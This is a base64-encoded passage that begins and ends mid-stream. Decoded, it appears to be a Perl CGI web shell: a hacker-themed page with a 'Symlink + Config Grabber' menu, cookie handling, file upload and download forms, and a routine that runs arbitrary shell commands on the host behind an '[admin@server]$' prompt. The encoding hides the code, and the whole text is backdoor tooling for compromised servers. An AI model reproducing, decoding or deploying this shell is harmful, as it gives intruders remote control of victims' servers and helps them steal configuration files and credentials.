4M0RLTHVDZGRsaU13czNBQmthT2tlTFRGdkMyT1p1V2ErbW5RdDBBMzl6cG4yWDM3Z3ErbnJzNlVDOTJCL2RsdjVwN1B1MW53ejFudGpkZDdCUFBPMU50U1dhKzlKT05qVWtEbTRuajAyK1crdHIzVjkvdzkyTm9mclFSdCtmTkxZUHJ0dFUrTWVuTnIxODVvNzJrUlBkdFR1N0VtMzNuZWlJaC9sTXpiZG9MMVBhMjdtUjVyUStON2ZqNnp3SnJXWHp0WUJOWUJSTlRXaVZDSG1OSnhqQkIwTkxCZ3lJVFRXRmxaZWk5K3BZSWlLRzhXQVBzZktxN1B5dFloZEtDYzl1SWR0OUZSOXpibnRaelpINU04SkZHM2hPM1VzL0k2ODZxL1BzSHlLdk91MUpVRml5WUFQYURRaElGbXBDeXo0MmxRLytuMDgzaFI0TDB2MVpDam9XSXB5OFU0d2pLWFNQWEprTG5rWDNIeUlYUElOdUNpNFdKTnlnd0lvRktiODBuUWRXYUc5VTg4RDNGUFBBUmRxeit0OHpEL3lFRlplTlZxMmxxUHJEcElPdjB1MzQ2RlZXVDkyQ25aQzV5THlyNlBMdXFRN0pSZHgxRHV4SU1SZjhPWlZMb1NLWG9yVFRPZWFDM2JOeXdaWFd5WEZISlFaaHZJcE5xZVJwRVEyd2F6eHBySWJqU3VKR1dpcXE2V0VsSit5bEloR0tVcEhBc3UwRlJHSnViRVh0YXpFVFRGM0pxWWVMWnNVenhaYW1LUmcxaDBIYlZLTnlPVk5jcjkyemVoTDFNNjNjS1c2UzlzTHc0WjU2c3lqclM0b2R6T25XeUJJRkVHZ3VTbnhTTm1LLytpUnRzNnMrZVh5QkI3WDNjODJYZjlxVVNUYzJwak5OeFhmeXl0aFk0ZTFVVzFzcTBicWUvWDlUNjllbkVtMDNLR3Z3R2U0Yzl4N2paUllCRmR2VnZQTGk0Z3hWNFJwVU5oejRyTFMvY1V6TkppL0RnSUhhRWlFbVBLRzNPYlZLZjJPejBnNXhNZmEzZG1LbXVRcHp5V1ZNUlkyU1M0WmhadWZOSmxkZmtVN1cyWXViWENOME1nN2QxcjJoUDVIQitXaTZkM2wzZjUrWU9XZXhrN3Y4TjhTR0R1endyNC90T2doZjZVeTBEcldPMXAvWmhwTVJDUTIxampTZTJWcC9TNVM4NDNGTkZCSWV4OFRKN0pab3NRL1ltL1E1STRnWjE4M1hWZGc3WDFkaG45cFZPQ2U0eXFpbmM5WE93cWpsNTNRWGZnNlYrM3dkaHJsL0t1YVRaOUxXK3ArbWJWeHd1VDNJY29zZ2xYMGNpYWpRNTVCSWkydm5wekZaekE4cU5DcVl0bU0rR3N2bm85RmZ6Q203YUxHMTRQYlFCbm9XMnpWUWlpcDhEcWw3Rk0wOUw2MnJabUpiaGQ0aXRyMTdMc1Z6b2EyYVUzYlJuSEw1VkU1WkhjdjRZa3NwSEs5U2psZUpNekV1TnErQzBYeThnQ3lBYmVjTXMyOGVEMjdlTVQ4MEg3YWx2WFZCbmlwaHJjL2JYVGM4MVYyMytuOTVkMTFNV0g5c2gxMFNSQkg5bUQ2NzJpZW9zS285KzJIOERrQWIzZXJ6bXNxS3oydXFVbnYycTRBREU5ak9aQkpSaDE5OWFCT2lEcjlqNnFGTlpaakN0cU42bS9IUUp2dVZEMjJhMGJlLytOeW0ycDBydW8vdXFKdmR1VCs4N3VaMGVzT0t3am5kcytVRlE4RFhOUHJVcml2YjkvZnM2NDZGcXhUN29jeGxIY3psVW1ZbDgvTGMyY1JkOVN0UzhpS1E0MlZKK21ENTRNVjhSSkhTaVBLWVY1am84WlRMQ2RJYlY0N0h4WHhLa2Q1VmY0VDVseU5CSlJZU3g4ZmlnR0Z3MnVSbEsyZy9sLytFWEN5MFZqNVdWczdPWFRzZkl6ZzY5OXdZU09hamQ3alh0UXpvajBXSVoyZ1hJUTlITzJWeXlyTVE1VW9PTzFUbGpXWTdicEV4cWdzTEg0ZGl4c2d3YlNaa01kUENha3M1N1Z0bEFpOGY4VTA1dHR6bDdGbXFzM0d2a0JtN0dwUlR4akQ0SkpCS20rUkg5dkEyUkhvejl0SG9zUHBxVnZJaTg2TnZ1ZXZLeWYzcW5wcmUyc3o1aTZlR0JxT0w5YjZZTGZPWmJJRGRTbHBJaDBHamx2Q2JTSnhjLyt2Zm1WanVKYU8yZGY5M1orUWJJb0J3RzVrVFRDNkVucUUvSmNjeHhKMmtDQUU3ZDJVNHpLRGxWd3NoaktDdHh2amdPaVhuYTZJNVh5eXZFR0RBcTVNWTZVYThhelpOMG94REV2M2prQlpHSmdpeW9STGU2Mnk1VWhmTkdaaUZISThQaUFVMm9HK05TV0Q0a1FkL3RObzJ6cGdYSjlGa1pJUlorM053N1NrNWhCbFBISmpPSXN4dUJ4ZE9VZFJYSDFpenNhbnRzLzd3eHRyMzJNS1gzYkdtdUs5T2RFWDc0eTMzUlVQOTNVMGJHZ0luTEFFeEZJaDZTODNsWWpBUTk1bklnMytYanFacXlVLzZ4ZzkyZGQrMjRUT0ZjbE81UGJ1aks4WDd4L3llam0zOU4zVS9rTi9VOUtkYjZySzMzdGZZT0xxcHZyWi9qMjMzb1NQSytsWHFlM29abm5hbEhacGQ0WU9HdlRvbE93eFlYMDQ3MUNybFB1TnVFOVl2Q2NwcUZjUzhXeW1rOTlQRElXWHAwbkkvZk9TMUE1aEhIU05KazVWRFdGcGZXWDMxSXFHRjF0WVZoVVA3NXRzSk1sOFYwZk5Ycmg5Q0RKb28reDdnQlMxNEJKSldsTGpVVkJzdlhiR05WNGxHYVhjb0U2MUtxYktQZ1NqK21XYjNsRUVuek04MUd6a2YrR0Ura0ZISlRsdjZqcGNaN2VCeGFUV1RLdnJJVzVRR2V2UVpGV1ZZaUkrTGlYWm1rZzJXR1cydDU3aE9QNzlhdWZrQ2tZU1ovUmlaV2QwV21kLy9ISE9JL0l3YlpBZVY1enNxVG9MeXFLT3A1enVpVTNDSS9RWDUyZUhEOEh1Ry9FekRYUFgzQXZ4ZXc5Q2Z3NzBUM0hiMlplMDU4TlVXTXloWjJoSmttZnF3SDJRZ2R2UkNvMkZocUJKbmxBNkJ5SzNwVG04SnNmL0JEWUZ3UzEzQzJsamJuMjFyMTRSclJ3YzZUUHNNUWtVaW92dE1yTE5yQjl4TDVEYXhMMmxQSy9leWkvblM2WHNaWnQ5TDJUK0o5d0lUTUwxTDBzTHFpVGpqTnVLdFl4ditSMlZYRTlyR0ZZVDM3VnV0MXBJc1c3Ritva2lLbzhqeTRncHAwVzZOSTB0RWpscUVDTlFJSTRRalNqREJPREZxcXhZMzlrR1lrSWhTU2lpbXRBVzM5RkJLRDBYNElCa1RSQW1CVUVvZ1VId29EWmdjZXVpaHVBVWZTZytsY1RkOTg5N0syc3BKU3cvTExnTnZaK2J0bTUxNVAvTU4zcGRjbzhxRU9BOU1Ya25mZXJNNENIb3AraDcvSFFyOUgxNlcvK1QxaFluVkxOV1F4bGZ6dUlHYmRCMUc1Z29jak9kVEdvQXdBbmFZWDZXYkp1U242TFFEZGh0ZEl6MXJaM1Zpb0UvYmtqMEYrOVZ0aTBnUmw5ckJVWFlXc2IrWG8vMkUrVWp4bmNWUTVNSjAzSkhPNVBMcE10b3pLT2VBOHZKTDZVdUNrbHE1bkhlc1NjNVFMQ29XazFwcHJuS01RblVvRXgyKzZ1a3dvclJrRFNEUFZJcWtSWFdRam5RSW1uVWcvZGZtNFZjZWRMWGRNdFBCNjJjNjlQZG90SjlRTmdrTHdxTzdKbjBJNFFyK2swZ2Fqd3B6Q3NpZWZzdVEvWjhVa0YvL0RUZTVQemdYaWZIeU1KSmIwU1A1VDZnMHZCUEp2NVRJNzJEclNXZnNMTEp6OUpEQVRrU3BxMjI3ZlZSNkg5MHQvVmZwODI4SFRMTGZpK1JTSnRrWE41MkpnbGdrWWhhWm1LdlNFTzMwSG9YdEplK2pLOWlIdDBqZkp5aVNKN0ZCcXhBemJsMVR0TkYvbVhHRGtjc2RYOS9ZbHd0THVleHlRWllMeTluY1VrSG0zMDFWNXhRNEhwaXVGaFdsV0tVK0tQdjBaM3lmKzliSStTcHgyd01RelhqQ21yYURKVzZFdkg0b29LcVVhaENNZGNSbndqVkRnYXRleGlHc0xSTEpwcDdqVWN6UDJVd3ltWUVMWFNJaDIvUjBNcGxDcGU1VE9aN0x4Wjl4Z1czTDNBci9OZjZNK0JJdlozSWZkcUdMbGp0QUVYbVJqRUtyRHgrdThoTDZhRWJmMHJjdWtMWjUwbmFQdGcxMzI3WjRkVWM0YWs1cm5MUVFEQUFBc3hzZ1RjZzdVRWovYVFlVlVHbEdmMDJ2UXIwUzBvZDNMVFl1Q1lpbUNYb21uOHdvbkhETzFJTUJOei9oSEl4Qnhod1VsNGlRcUhDQUVrNXA0S2xhSjltcFpjdWo5bWt5NllKanlLY3RVUDBsU2YyMFRBUjRJZFgyMkdpaUZjME9HMzl4TW9PbUlwTWFPekxCRUtHdFlXdFlkSHVDeUVjZVREdUc0L0xGZFo1ZjM0aisrczNjTlRVY1c1NjYzZkNnVGI5ZTQzbjB4a205RS9pNFBsdUxqWTErY3ZtSEgwUG84NFk3N2dzbzNzYmU5KzZSaldIUHB6Y2J2a1RBRjNjM3Zyd1I4SDR3UFA3TExsc3ppZktQOGE3d08yY2xNZkF0VnFtNFBUaXNhUVkwWWd1clhUaGpLTDRsZVZXV05DZjIwQkxGYmxubmJaR2lKWXFRTVdkaFdBUUcxdG9ZUlIvWThUS2NXb2lPeHlTYS9BbElwRTVhS0pQbTB6UEhGeUh4QzhXQURDQ1lNRVJJaENkYkk3SVRlNkpvdmJHR3dxTERPV1NyVlJacU5xZkRMcTd4dk1DWFh5MEtBbytGOTY5ZTFXZlJ0ajY3dEZtL2RrN2ZSNzZwYW4xelVhcGNyMDhjSEV6VXIxY2tacDlnTkIzY0laWWpkMDlDMDJLSERIOFUyNm0xc3B2aFk1T3VzQXVhSEJiQTNsS1ErMHZySlo3bHhqbU8xanlBbWdEc0s0YVF4dFF3TDA2Nk5GZnE5VlpuUWZXN0ZYbWxjbmpZNU9QWnVESXpvOFN6L2liVUp1MDhjSHdvaVRkcnJDd3BhbXFaakthZFAvOWtBZDg1dk1pK1YrcnBBVDR3K0Q2WEs1bTRrdkFZcVAwTXRhYk5QekhxdTcxeW5OMWZ1OEphOE1sN3NjbndzTGdoM1BnYjE0dExYd0FBQUhqYVkyQmtBSUl6Wnd6bnJYa2N6Mi96bFVHZUF5VEFjTzZNNmswRS9XOEpDd1BiRWlDWGc0RUpKQW9BbTZZTlNIamFZMkJrWUdCYjhyY0lSRElBQVFzREF5TURLbmdCQUZGY0E3SjQybldUc1V2RFFCVEdYMW9SUittYW9ZTUVCd2NSd1JKRUFpSWRnaFFKUlJ4S2h1SWdMaVZJRWNmZzRCQ2taSEZ3RkJGY0hCeUtGUDhNTjJjUndjbFp4Ty9kZmNWNGFPREg5L0p5ZCsvZGQ1ZmF1MndKbnBsZmVFZGdEbkVMREVBQUl1UnVvSzlrQ0ZMa1ZrQVRIT0w5M09ia2t0OVBRQXpPdUU0T0RpdzYzdE42KzV5aitnZ1MwT0Q0bERvaCt0NERZK1pQbWQ4RUdWZ0hGOVNNN0lBKzhEbHVsVEhtZTdxdkVmaGczWG5rT3RCalVMS25oT1RVa3JYTFN0eGxuRlQwbWZ2V2VRWFlBSXZzTFdhZlY2aDN6M2liM2c5WlYvZlpzYjJhTVFWOWI3UGYzTlpWNzAzdWszNnFSMStJYTZESGZrTDZIZG04OGUrTzU3b0FsdWg5NHg5YVhIZmlNSFlJS3VmZ01xTDJIWHp1djZUdmZ4RTVaekZsNEpCVi9IZEpxWVZEekRreDl4blJjNzMvTC9WRVpQWmFaS3ExTlJIdkZ2Z1dlWUoyb2FrNXUrWVA1bDhRL2gvTEZ0a0R1K1JOYStsY2ZNTzk4TnE2THZzSTZnOG1EaVg4QnVIcVh3WjQybU5nWU5DQnd5cUdMWXd6bUl5WXJqRVhNTTlpUHNMOGdjV0hwWS9sQ01zalZoRldEOVo5clAvWUN0aWVzZHV3ditOSTRsakFxY1k1amZNV2x4cVhEVmNjVnduWEkrNHluaVNlTjd3T3ZGTjRML0N4OFJYeHJlSjd4Sy9FbjhUZkljQWg0Q1V3VCtDRFlJVGdDU0Vub1NLaGJjTEhSR3hFcWtTMmlMd1RsUkwxRTYwUW5TYTZUdlNjV0lEWUdyRi80akhpK3lRQ0pJNUo4a2ptU1Y2UTRwTUtrdG9qOVVmYVQzcU5ESStNaTh3R1dRNVpIOWx0Y3J2a2Zza1h5YTlRRUZFd1VKaWo4RVBoaDZLYjRqWWxGYVU1eWh6S2VzcVBWRlJVenFuNnFlYW9UbEhkcEZhaU5rbnRoYnFaZW84R2g0YUdScFhHTVkwdm1sYWFUWnBYTkw5b1ZXanphVC9SQ2RQMTAvUFFkekhJTXB4a3RNMll6M2lTOFEwVE9aTXNrd2VtYXFZNXB0dk1qTXhXbWV1Wjk1aS9zdkN5dUdXWll0bG14V1VWWWJYQ21zRzZ6dnFRalpUTkZsczcyek4yY2ZZUzloY2NPaHlESEI4NStUaHRjMVp4UHVFaTRaTGhzc2ZWeW5XTG00WGJGTGNQN243dUR6enlQRFo1R25rMmVGN3kwdkphNGEzaDNlZmo1WFBBTjgvM2xaK1FYd3dPbU9WWDRkZm1OODl2bTk4YmZ5WC9DUDlkQVZJQkZRRWJBZ1dBVUM4d0NBalBCSGtFWlFRdENib0ZBR1FibHFNQUFRQUFBT2tBVFFBRkFBQUFBQUFDQUFFQUFnQVdBQUFCQUFIRUFBQUFBSGphblpLN1NnTkJGSWIvM2NSTFVJSVJDUllpVTRpZG00MUcwRlNDUVN6Y1J2RFNiaTdHWUM2eUdSSEJ3bWZ3Q1N4OUFwOUJ3Y3JLSjdIMm45bXppc0ZFQ1VNbTM1enpuOHZPSEFBNXZDRUZKNTBCY005ZnpBN3lQTVhzSW90SDRSUjI4Q1NjeGlvK2hDZXc2Q3dKVDJMRktRbFA0YzQ1Rlo3R3N2TXVuQ0Vuc1RNb3VRdkNzK1I5NFRuazNWdmhITEp1MHM4ODdRL0N6K1NrbnhmNDdpdDIwY01sYmhDaGhTYk9vYUd3RGg5RkxrVnZpQzRWWFhwcjVEWnRCOVRVNFpFTUczdUQvajczT2kxWDVEbzVJbXZtYS9EL0NGVnIxOXdWOW13Ky9TTzZablZGWnZVSDFJRlY5M0JJUlpPV05ydUlobWpVZ0VyaDJIYlNaeDJqVU16dVlXdG9qY0g0LzBRbnNXc2pPd3p0cmZ4K24wWnR2ajZ5OFMzVzA3WnVmSithRk5vYjdWamxCZjJLR2M3K2VKMktQV3ZwUE9BcFpQYkVQOXBycGtCektzb29jRjNiNWRIK0hkT1JDSTkxZXp3Vnhvb1ovNlZQcUtueURwSkppaWNua08rcDBGdXo4N2t0MDF6R0psL083UDdYZkc5OEFvdE9sbHdBZU5wdDBFVnNGSEVVeC9IdmEzZTc3ZGJkS2U0eU05dXA0THR0QjNkM0NyVkZXdGl5dUliaUVnZ0pOd2gyQVlKcklNQUJDRzVCQWh3NDQrRUFYR0hhK1hQakpTK2Z2UC9oOTE3K1JOQlNmOXgwNW4vMXlXNlJDSWtrRWhkdW92QVFUUXhlWW9ram5nUVNTU0taRkZKSkk1ME1Nc2tpbXh4eXlTT2ZWaFRRbWphMHBSM3Q2VUJIT3RtYnV0Q1ZiblNuQnozcGhZYU9nWTlDVElvb3BvUlNldE9IdnZTalB3TVlpSjhBWlpSVGdjVWdCak9Fb1F4ak9DTVl5U2hHTTRheGpHTThFNWpJSkNZemhhbE1Zem96bU1rc1psTXBMbzdTeENadXNKK1BiR1kzT3pqQWNZNkptKzI4WnlQN0pFbzg3SkpvdG5LYkR4TERRVTd3aTUvODVnaW5lTUE5VGpPSHVleWhpa2RVYzUrSFBPTXhUM2hxLzFNTkwzbk9DODVReXcvMjhvWlh2S2FPTDN4akcvTUlNcCtGTEtDZVF6U3dtRVdFYUNUTUVwYXlqTThzWnlVcldNVWFWbk9WdzZ4akxldlp3RmUrYzQyem5PTTZiM2tuWG9tVk9JbVhCRW1VSkVtV0ZFbVZORW1YRE1ua1BCZTR6Qlh1Y0pGTDNHVUxKeVdMbTl5U2JNbGhwK1JLbnVSN3d2VkJUZFBLSFhXbFgxT3FPV0FvZlVwVFdkcXNZUWNvZGFXaDlDa0xsYWF5U0Ztc0xGSCt5L003NmlwWDE3MDF3ZHB3cUxxcXNySE9lVElzUjlOeVZZUkREUzJEYVpVMWF3V2NPMnlOdnc2cm1WUUFBSGphUGN3OUVzRkFIQVh3YkZZMmtjK05DU296TVhSYmFiUWFTWlBHcUxJenptRkdwMUZ5Q2dmNFIrVVNqdUFzUEt6dDN1L05tM2RucnhPeHM5TlFzR2s3eGk2NnE0VnFweVIxUThVVzRhZ25KTlN1ZFlpWEZYRzFKbEZXTi81MDFSY2VJSzRHUGNBN0dQaWYyY01nQVB5aFFSOElzaDhZaGVZMlFodEtWM1c4M29NeEdJMHNFekJlV2FaZ3NyRE13SFJ1S2NGc1pwbURjbXc1QVBQbG41b0s5UWJpQmtxc0FBQUJVcVoxV2dBQSkgZm9ybWF0KCd3b2ZmJyk7DQogICAgZm9udC13ZWlnaHQ6IG5vcm1hbDsNCiAgICBmb250LXN0eWxlOiBub3JtYWw7DQoNCn0NCg0KYm9keSB7DQpmb250LWZhbWlseTogInVidW50dV9tb25vcmVndWxhciI7DQpmb250LXNpemU6MTJweDsNCmJhY2tncm91bmQtcmVwZWF0OiBuby1yZXBlYXQ7DQpiYWNrZ3JvdW5kLWF0dGFjaG1lbnQ6IGZpeGVkOw0KYmFja2dyb3VuZC1wb3NpdGlvbjogY2VudGVyIGNlbnRlcjsNCmJhY2tncm91bmQtc2l6ZTogMTAwJSAxMDAlOw0KYmFja2dyb3VuZC1jb2xvcjojMmQyYjJiOw0KY29sb3I6bGltZTsNCmJhY2tncm91bmQtaW1hZ2U6IHVybCgnaHR0cHM6Ly9zdGF0aWMuemVyb2NoYW4ubmV0L0FsbGVuLldhbGtlci5mdWxsLjEwMTIyMTUuanBnJyk7DQp9DQojbmF2e3Bvc2l0aW9uOmZpeGVkO3otaW5kZXg6OTk5O3RvcDowO3dpZHRoOjEwMCU7bGVmdDo3MCU7DQp9DQphLm5hdi1mb2t1cyB7ZGlzcGxheTpibG9jazsgd2lkdGg6YXV0bzsgaGVpZ2h0OmF1dG87IGJhY2tncm91bmQ6IzE5MTkxOTsgYm9yZGVyLXRvcDowcHg7IGJvcmRlci1sZWZ0OiAxcHggc29saWQgI2ZmZjsgYm9yZGVyLXJpZ2h0OjFweCBzb2xpZCAjZmZmOyAgYm9yZGVyLWJvdHRvbToxcHggc29saWQgI2ZmZjsgIHBhZGRpbmc6NXB4IDhweDsgdGV4dC1hbGlnbjpjZW50ZXI7IHRleHQtZGVjb3JhdGlvbjpub25lOyBjb2xvcjpyZWQ7IGxpbmUtaGVpZ2h0OjIwcHg7IG92ZXJmbG93OmhpZGRlbjsgZmxvYXQ6bGVmdDsNCn0NCmEubmF2LWZva3VzOmhvdmVyIHtjb2xvcjojRkZGRkZGOyBiYWNrZ3JvdW5kOiMxOTE5MTk7IGJvcmRlci10b3A6MHB4OyBib3JkZXItbGVmdDogMXB4IHNvbGlkICNmZmY7IGJvcmRlci1yaWdodDoxcHggc29saWQgI2ZmZjsgIGJvcmRlci1ib3R0b206MXB4IHNvbGlkICNmZmY7DQp9DQppbnB1dFt0eXBlPXRleHRdew0KCWJhY2tncm91bmQ6IHRyYW5zcGFyZW50OyANCgljb2xvcjp3aGl0ZTsNCgltYXJnaW46MCAxMHB4Ow0KCWZvbnQtZmFtaWx5OkhvbWVuYWplOw0KCWZvbnQtc2l6ZToxM3B4Ow0KCWJvcmRlcjpub25lOw0KfQ0KaW5wdXRbdHlwZT1zdWJtaXRdIHsNCgliYWNrZ3JvdW5kOiBibGFjazsgDQoJY29sb3I6d2hpdGU7DQoJbWFyZ2luOjAgMTBweDsNCglmb250LWZhbWlseTpIb21lbmFqZTsNCglmb250LXNpemU6MTNweDsNCglib3JkZXI6bm9uZTsNCg0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5IG9uTG9hZD0iZG9jdW1lbnQuZi5AXy5mb2N1cygpIiBiZ2NvbG9yPSIyZDJiMmIiIHRvcG1hcmdpbj0iMCIgbGVmdG1hcmdpbj0iMCIgbWFyZ2lud2lkdGg9IjAiIG1hcmdpbmhlaWdodD0iMCI+DQo8ZGl2IGlkPSJuYXYiPg0KPGEgY2xhc3M9Im5hdi1mb2t1cyIgaHJlZj0iJFNjcmlwdExvY2F0aW9uPyI+PGI+SG9tZTwvYj48L2E+DQo8YSBjbGFzcz0ibmF2LWZva3VzIiBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1oZWxwIj48Yj5IZWxwPC9iPjwvYT4NCjxhIGNsYXNzPSJuYXYtZm9rdXMiIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPXVwbG9hZCI+PGI+VXBsb2FkPC9iPjwvYT4NCjxhIGNsYXNzPSJuYXYtZm9rdXMiIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWRvd25sb2FkIj48Yj5Eb3dubG9hZDwvYj48L2E+DQo8YSBjbGFzcz0ibmF2LWZva3VzIiBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1zeW1jb25maWciPjxiPlN5bWxpbmsgKyBDb25maWcgR3JhYmJlcjwvYj48L2E+PC9kaXY+DQo8YnI+DQo8Zm9udCBjb2xvcj0ibGltZSIgc2l6ZT0iMyI+DQpFTkQNCn0NCnN1YiBQcmludFBhZ2VGb290ZXINCnsNCnByaW50ICI8L2ZvbnQ+PC9ib2R5PjwvaHRtbD4iOw0KfQ0KDQpzdWIgR2V0Q29va2llcw0Kew0KQGh0dHBjb29raWVzID0gc3BsaXQoLzsgLywkRU5WeydIVFRQX0NPT0tJRSd9KTsNCmZvcmVhY2ggJGNvb2tpZShAaHR0cGNvb2tpZXMpDQp7DQooJGlkLCAkdmFsKSA9IHNwbGl0KC89LywgJGNvb2tpZSk7DQokQ29va2llc3skaWR9ID0gJHZhbDsNCn0NCn0NCg0Kc3ViIFByaW50Q29tbWFuZExpbmVJbnB1dEZvcm0NCnsNCiRQcm9tcHQgPSAkV2luTlQgPyAiJEN1cnJlbnREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkQ3VycmVudERpcl1cJCAiOw0KICAgIHByaW50IDw8RU5EOw0KPGNvZGU+DQo8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iPyI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFuZCI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0KJFByb21wdA0KPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImMiPg0KPC9mb3JtPg0KPC9jb2RlPg0KRU5EDQp9DQoNCnN1YiBQcmludEZpbGVEb3dubG9hZEZvcm0NCnsNCiRQcm9tcHQgPSAkV2luTlQgPyAiJEN1cnJlbnREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkQ3VycmVudERpcl1cICI7DQpwcmludCA8PEVORDsNCjxjb2RlPjxjZW50ZXI+PGJyPg0KPGZvbnQgY29sb3I9bGltZT48Yj48aT48Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iZG93bmxvYWQiPg0KJFByb21wdCBkb3dubG9hZDxicj48YnI+DQpGaWxlbmFtZTogPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImYiIHNpemU9IjM1Ij48YnI+PGJyPg0KRG93bmxvYWQ6IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+DQo8L2Zvcm0+DQo8L2k+PC9iPjwvZm9udD48L2NlbnRlcj4NCjwvY29kZT4NCkVORA0KfQ0KDQpzdWIgUHJpbnRGaWxlVXBsb2FkRm9ybQ0Kew0KJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7DQpwcmludCA8PEVORDsNCjxjb2RlPjxicj48Y2VudGVyPjxmb250IGNvbG9yPWxpbWU+PGI+PGk+PGZvcm0gbmFtZT0iZiIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQokUHJvbXB0IHVwbG9hZDxicj48YnI+DQpGaWxlbmFtZTogPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImYiIHNpemU9IjM1Ij48YnI+PGJyPg0KT3B0aW9uczogPGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJvIiB2YWx1ZT0ib3ZlcndyaXRlIj4NCk92ZXJ3cml0ZSBpZiBpdCBFeGlzdHM8YnI+PGJyPg0KVXBsb2FkOiA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJ1cGxvYWQiPg0KPC9mb3JtPjwvaT48L2I+PC9mb250Pg0KPC9jZW50ZXI+DQo8L2NvZGU+DQpFTkQNCn0NCg0Kc3ViIENvbW1hbmRUaW1lb3V0DQp7DQppZighJFdpbk5UKQ0Kew0KYWxhcm0oMCk7DQpwcmludCA8PEVORDsNCjwveG1wPg0KPGNvZGU+DQpDb21tYW5kIGV4Y2VlZGVkIG1heGltdW0gdGltZSBvZiAkQ29tbWFuZFRpbWVvdXREdXJhdGlvbiBzZWNvbmQocykuDQo8YnI+S2lsbGVkIGl0IQ0KPGNvZGU+DQpFTkQNCiZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KJlByaW50UGFnZUZvb3RlcjsNCmV4aXQ7DQp9DQp9DQpzdWIgRXhlY3V0ZUNvbW1hbmQNCnsNCiAgIGlmKCRSdW5Db21tYW5kID1+IG0vXlxzKmNkXHMrKC4rKS8pICMgaXQgaXMgYSBjaGFuZ2UgZGlyIGNvbW1hbmQNCiAgICB7DQogICAgICAgICMgd2UgY2hhbmdlIHRoZSBkaXJlY3RvcnkgaW50ZXJuYWxseS4gVGhlIG91dHB1dCBvZiB0aGUNCiAgICAgICAgIyBjb21tYW5kIGlzIG5vdCBkaXNwbGF5ZWQuDQogICAgICAgDQogICAgICAgICRPbGREaXIgPSAkQ3VycmVudERpcjsNCiAgICAgICAgJENvbW1hbmQgPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiJjZCAkMSIuJENtZFNlcC4kQ21kUHdkOw0KICAgICAgICBjaG9wKCRDdXJyZW50RGlyID0gYCRDb21tYW5kYCk7DQogICAgICAgICZQcmludFBhZ2VIZWFkZXIoImMiKTsNCiAgICAgICAgJFByb21wdCA9ICRXaW5OVCA/ICIkT2xkRGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJE9sZERpcl1cJCAiOw0KICAgICAgICBwcmludCAiPGNvZGU+JFByb21wdCAkUnVuQ29tbWFuZDwvY29kZT4iOw0KICAgIH0NCiAgICBlbHNlICMgc29tZSBvdGhlciBjb21tYW5kLCBkaXNwbGF5IHRoZSBvdXRwdXQNCiAgICB7DQogICAgICAgICZQcmludFBhZ2VIZWFkZXIoImMiKTsNCiAgICAgICAgJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7DQogICAgICAgIHByaW50ICI8Y29kZT4kUHJvbXB0ICRSdW5Db21tYW5kPC9jb2RlPjx4bXA+IjsNCiAgICAgICAgJENvbW1hbmQgPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiRSdW5Db21tYW5kLiRSZWRpcmVjdG9yOw0KICAgICAgICBpZighJFdpbk5UKQ0KICAgICAgICB7DQogICAgICAgICAgICAkU0lHeydBTFJNJ30gPSBcJkNvbW1hbmRUaW1lb3V0Ow0KICAgICAgICAgICAgYWxhcm0oJENvbW1hbmRUaW1lb3V0RHVyYXRpb24pOw0KICAgICAgICB9DQogICAgICAgIGlmKCRTaG93RHluYW1pY091dHB1dCkgIyBzaG93IG91dHB1dCBhcyBpdCBpcyBnZW5lcmF0ZWQNCiAgICAgICAgew0KICAgICAgICAgICAgJHw9MTsNCiAgICAgICAgICAgICRDb21tYW5kIC49ICIgfCI7DQogICAgICAgICAgICBvcGVuKENvbW1hbmRPdXRwdXQsICRDb21tYW5kKTsNCiAgICAgICAgICAgIHdoaWxlKDxDb21tYW5kT3V0cHV0PikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAkXyA9fiBzLyhcbnxcclxuKSQvLzsNCiAgICAgICAgICAgICAgICBwcmludCAiJF9cbiI7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAkfD0wOw0KICAgICAgICB9DQogICAgICAgIGVsc2UgIyBzaG93IG91dHB1dCBhZnRlciBjb21tYW5kIGNvbXBsZXRlcw0KICAgICAgICB7DQogICAgICAgICAgICBwcmludCBgJ